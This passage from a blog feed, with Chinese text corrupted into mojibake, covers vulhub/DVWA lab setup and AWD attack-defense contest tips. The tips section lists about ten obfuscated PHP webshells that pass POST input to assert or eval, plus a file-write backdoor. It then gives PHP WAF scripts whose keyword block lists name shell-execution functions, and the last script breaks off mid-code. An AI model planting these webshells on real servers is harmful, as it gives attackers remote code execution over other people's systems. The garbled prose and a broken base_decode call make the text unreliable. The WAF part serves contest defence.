vulhub</p><p>unbutué‡Œcd vulstudy&#x2F;</p><p>å†cd DVWN&#x2F;æ”¹ç«¯å£</p><p>vi docker-compose.yml</p><p>iptables -F</p><p>systemctl start docker </p><p>docker-compose up -d &#x2F;&#x2F;å¼€å¯dvwa</p><p>å¯åŠ¨é¶åœº</p><p>åœ¨ <code>docker-compose.yml</code> æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å¯åŠ¨é¶åœºç¯å¢ƒï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤ä¼šåœ¨åå°å¯åŠ¨æ‰€æœ‰å®šä¹‰çš„æœåŠ¡ã€‚ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å®¹å™¨çš„çŠ¶æ€ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></td></tr></table></figure><p> è®¿é—®é¶åœº</p><p>é€šå¸¸ï¼ŒDocker Compose ä¼šä¸ºæ¯ä¸ªé¶åœºåˆ†é…ä¸€ä¸ªç«¯å£ï¼Œå…·ä½“çš„ç«¯å£å·å’Œè®¿é—®æ–¹æ³•ä¼šåœ¨ <code>docker-compose.yml</code> æ–‡ä»¶ä¸­å®šä¹‰ã€‚</p><p>ä¾‹å¦‚ï¼Œå¯¹äº DVWAï¼Œé»˜è®¤çš„ç«¯å£æ˜¯ <code>80</code>ï¼Œä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹ URL è®¿é—®ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//localhost:80</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¸åŒçš„é¶åœºï¼Œè®¿é—®æ–¹å¼å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œè¯·æŸ¥çœ‹å„ä¸ªé¶åœºç›®å½•ä¸­çš„æ–‡æ¡£æˆ– <code>docker-compose.yml</code> æ–‡ä»¶æ¥è·å–è¯¦ç»†çš„è®¿é—®ä¿¡æ¯ã€‚</p><p>åœæ­¢å’Œåˆ é™¤é¶åœº</p><p>å½“ä½ å®Œæˆé¶åœºç»ƒä¹ åï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åœæ­¢å®¹å™¨ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose down</span><br></code></pre></td></tr></table></figure><p>è¿™å°†åœæ­¢å¹¶åˆ é™¤æ‰€æœ‰å¯åŠ¨çš„å®¹å™¨ï¼Œä½†ä¸ä¼šåˆ é™¤æ•°æ®å·ã€‚å¦‚æœä½ å¸Œæœ›å®Œå…¨åˆ é™¤å¹¶æ¸…ç†æ•°æ®ï¼Œå¯ä»¥åŠ ä¸Š <code>-v</code> å‚æ•°ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose down -v</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>AWDå§¿åŠ¿æ€»ç»“</title>
    <link href="/2024/09/28/AWD%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/09/28/AWD%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h6 id="1-å‡†å¤‡ä¸€ä¸ªwebshellè„šæœ¬-å¸¦å¯†ç çš„webshellï¼Œæ³¨é‡Šå˜å½¢ï¼Œå­—ç¬¦ä¸²å˜å½¢ï¼Œè‡ªå¢å˜å½¢ï¼Œåˆ©ç”¨æ–‡ä»¶åï¼Œåˆ©ç”¨-htaccess"><a href="#1-å‡†å¤‡ä¸€ä¸ªwebshellè„šæœ¬-å¸¦å¯†ç çš„webshellï¼Œæ³¨é‡Šå˜å½¢ï¼Œå­—ç¬¦ä¸²å˜å½¢ï¼Œè‡ªå¢å˜å½¢ï¼Œåˆ©ç”¨æ–‡ä»¶åï¼Œåˆ©ç”¨-htaccess" class="headerlink" title="1.å‡†å¤‡ä¸€ä¸ªwebshellè„šæœ¬:  å¸¦å¯†ç çš„webshellï¼Œæ³¨é‡Šå˜å½¢ï¼Œå­—ç¬¦ä¸²å˜å½¢ï¼Œè‡ªå¢å˜å½¢ï¼Œåˆ©ç”¨æ–‡ä»¶åï¼Œåˆ©ç”¨.htaccess"></a>1.å‡†å¤‡ä¸€ä¸ªwebshellè„šæœ¬:  å¸¦å¯†ç çš„webshellï¼Œæ³¨é‡Šå˜å½¢ï¼Œå­—ç¬¦ä¸²å˜å½¢ï¼Œè‡ªå¢å˜å½¢ï¼Œåˆ©ç”¨æ–‡ä»¶åï¼Œåˆ©ç”¨.htaccess</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;assert&quot;</span>;<br>@<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;e&quot;</span>.<span class="hljs-string">&quot;r&quot;</span>.<span class="hljs-string">&quot;t&quot;</span>; <br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[pass]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">substr_replace</span>(<span class="hljs-string">&quot;assexx&quot;</span>,<span class="hljs-string">&quot;rt&quot;</span>,<span class="hljs-number">4</span>);<br>@<span class="hljs-variable">$a</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;s&quot;</span>.<span class="hljs-string">&quot;e&quot;</span>.<span class="hljs-string">&quot;rt&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">base_decode</span>(YXNzZXJ0);<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$a</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shyshy</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;this-&gt;<span class="hljs-subst">$a</span>&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">shyshy</span>();<br><span class="hljs-variable">$b</span>-&gt;a=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shyshy</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br>@<span class="hljs-title function_ invoke__">shyshy</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>.=<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$d</span>=<span class="hljs-string">&#x27;data&#x27;</span>;<br><span class="hljs-variable">$$d</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];  <span class="hljs-comment">//$data</span><br><span class="hljs-variable">$f</span>=<span class="hljs-string">&#x27;fp&#x27;</span>;<br><span class="hljs-variable">$$f</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-string">&#x27;wb&#x27;</span>);  <span class="hljs-comment">//$fp</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>):<span class="hljs-string">&quot;save success&quot;</span>:<span class="hljs-string">&quot;save fail&quot;</span>;<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>2.wafå‡†å¤‡ï¼šæ‹¦æˆªæ¶æ„payloadï¼Œæ¶æ„å­—ç¬¦ä¸²ï¼Œflagè¾“å‡ºä¸€ä¸ªå‡flagï¼Œè®°å½•æ—¥å¿—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php">åªè®°å½•æµé‡ï¼Œæ— è¿‡æ»¤åŠŸèƒ½<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOG_FILENAME&#x27;</span>, <span class="hljs-string">&#x27;log.txt&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) <span class="hljs-variable">$headers</span>[<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-title function_ invoke__">ucwords</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>))))) ] = <span class="hljs-variable">$value</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>    <span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>    <span class="hljs-variable">$header</span> = <span class="hljs-title function_ invoke__">getallheaders</span>();<br>    <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>];<br>    <span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>    <span class="hljs-comment">//rewirte shell which uploaded by others, you can do more</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$files</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&quot;virink&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$header</span>[<span class="hljs-string">&#x27;Accept&#x27;</span>]); <span class="hljs-comment">//fix a bug</span><br>    <span class="hljs-variable">$input</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;Get&quot;</span> =&gt; <span class="hljs-variable">$get</span>,<br>        <span class="hljs-string">&quot;Post&quot;</span> =&gt; <span class="hljs-variable">$post</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span> =&gt; <span class="hljs-variable">$cookie</span>,<br>        <span class="hljs-string">&quot;File&quot;</span> =&gt; <span class="hljs-variable">$files</span>,<br>        <span class="hljs-string">&quot;Header&quot;</span> =&gt; <span class="hljs-variable">$header</span><br>    );<br>    <span class="hljs-comment">//deal with</span><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;select|insert|update|delete|and|or|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;<br>    <span class="hljs-variable">$pattern</span>.= <span class="hljs-string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;<br>    <span class="hljs-variable">$vpattern</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-variable">$pattern</span>);<br>    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$vpattern</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$kk</span> =&gt; <span class="hljs-variable">$vv</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/<span class="hljs-subst">$value</span>/i&quot;</span>, <span class="hljs-variable">$vv</span>)) &#123;<br>                    <span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-title function_ invoke__">logging</span>(<span class="hljs-variable">$input</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$bool</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logging</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);<span class="hljs-comment">//ä¿®æ­£æ—¶é—´ä¸ºä¸­å›½å‡†ç¡®æ—¶é—´</span><br><span class="hljs-variable">$time</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;Y-m-d H:i:s&quot;</span>);<span class="hljs-comment">//å°†æ—¶é—´èµ‹å€¼ç»™å˜é‡$time</span><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(LOG_FILENAME, <span class="hljs-string">&quot;\r\n\r\n\r\n&quot;</span> . <span class="hljs-variable">$time</span> . <span class="hljs-string">&quot;\r\n&quot;</span> . <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>, <span class="hljs-literal">true</span>) , FILE_APPEND);<br>    <span class="hljs-comment">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span><br>    <br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs php">è®°å½•å¹¶è¿‡æ»¤éæ³•è¯·æ±‚å­—ç¬¦ï¼Œè‹¥æ£€æµ‹åˆ°è¯·æ±‚å­—æ®µä¸­å«æœ‰flagï¼Œåˆ™ä¼šæ˜¾ç¤ºå‡flagã€‚<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">date_default_timezone_set</span>(<span class="hljs-string">&quot;PRC&quot;</span>);<br><span class="hljs-comment">//è¿™å—åœ¨å¼€å§‹çš„ä»£ç æ²¡æœ‰çš„ï¼Œæˆ‘åŠ çš„ã€‚ä¸åŠ å°±ä¼šæŠ¥é”™ã€‚</span><br><span class="hljs-comment">//error_reporting(E_ALL);</span><br><span class="hljs-comment">//ini_set(&#x27;display_errors&#x27;, 1);</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">** çº¿ä¸‹æ”»é˜²phpç‰ˆæœ¬waf</span><br><span class="hljs-comment">**</span><br><span class="hljs-comment">** Author: Y</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ£€æµ‹è¯·æ±‚æ–¹å¼ï¼Œé™¤äº†getå’Œpostä¹‹å¤–æ‹¦æˆªä¸‹æ¥å¹¶å†™æ—¥å¿—ã€‚</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] != <span class="hljs-string">&#x27;GET&#x27;</span>)&#123;<br><span class="hljs-title function_ invoke__">write_attack_log</span>(<span class="hljs-string">&quot;method&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]; <span class="hljs-comment">//è·å–urlæ¥è¿›è¡Œæ£€æµ‹</span><br><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//è·å–postçš„dataï¼Œæ— è®ºæ˜¯å¦æ˜¯mutipart</span><br><br><span class="hljs-variable">$headers</span> = <span class="hljs-title function_ invoke__">get_all_headers</span>(); <span class="hljs-comment">//è·å–header</span><br><br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span class="hljs-variable">$url</span>)))); <span class="hljs-comment">//å¯¹URLè¿›è¡Œæ£€æµ‹ï¼Œå‡ºç°é—®é¢˜åˆ™æ‹¦æˆªå¹¶è®°å½•</span><br><span class="hljs-title function_ invoke__">filter_attack_keyword</span>(<span class="hljs-title function_ invoke__">filter_invisible</span>(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-title function_ invoke__">filter_0x25</span>(<span 